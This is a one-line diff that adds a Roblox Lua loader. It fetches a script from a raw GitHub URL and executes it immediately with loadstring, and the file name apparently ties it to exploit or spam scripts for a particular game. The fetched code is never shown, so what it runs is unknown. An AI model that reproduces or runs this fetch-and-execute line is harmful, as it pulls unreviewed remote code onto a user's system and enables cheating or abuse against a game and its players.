@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/7-days-cat-sitting-spam1-d5r2p7ekn5aq5m.lua"))()
